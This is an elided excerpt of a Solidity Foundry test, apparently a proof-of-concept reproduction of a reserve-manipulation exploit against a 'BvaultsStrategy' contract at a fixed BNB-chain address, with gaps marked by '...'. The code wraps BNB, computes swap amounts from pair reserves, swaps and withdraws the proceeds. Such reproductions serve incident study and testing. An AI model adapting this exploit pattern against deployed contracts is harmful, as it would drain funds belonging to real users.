...
contract ContractTest is Test {
    ...
    BvaultsStrategy vaultsStrategy =
        BvaultsStrategy(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20);
    ...
    function testExploit() public {
        (bool success1, ) = address(WBNB).call{value: 34 ether}("");
        ...
        uint256 amountout = (998 * amountin * BDEXReserve) /
            (1000 * WBNBReserve + 998 * amountin);
        ...
        uint256 amountWBNB = (998 * amountBDEX * WBNBReserve1) /
            (1000 * BDEXReserve1 + 998 * amountBDEX);
        Pair.swap(0, amountWBNB, address(this), "");
        (bool success, ) = address(WBNB).call(
            abi.encodeWithSignature("withdraw(uint256)", 34 * 1e18)
        );
